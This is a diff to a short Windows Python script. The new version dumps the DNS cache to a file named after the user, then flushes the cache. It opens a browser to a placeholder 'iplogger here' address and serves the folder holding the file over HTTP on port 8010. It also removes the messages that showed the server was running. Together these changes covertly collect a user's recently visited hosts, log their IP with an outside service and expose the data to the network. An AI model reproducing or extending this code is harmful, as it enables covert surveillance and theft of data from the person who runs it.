@@ -1,16 +1,17 @@
-import os
-import time
+import webbrowser as wb
 import http.server
 import socket
 import socketserver
 import os
 
-(os.system('ipconfig /displaydns > dns_logs.txt'))
-os.system('ipconfig /flushdns')
+os.system('@echo off && ipconfig /displaydns > %USERNAME%.txt')
+os.system('@echo off && ipconfig /flushdns')
 
 PORT = 8010
 
 os.chdir('C:\ESD')
+
+wb.open_new('iplogger here')
 
 Handler = http.server.SimpleHTTPRequestHandler
 hostname = socket.gethostname()
@@ -21,8 +22,4 @@ IP = "http://" + s.getsockname()[0] + ":" + str(PORT)
 link = IP
 
 with socketserver.TCPServer(("", PORT), Handler) as httpd:
-    print("serving at port", PORT)
-    print("Type this in your Browser", IP)
     httpd.serve_forever()
-
-time.sleep(100)
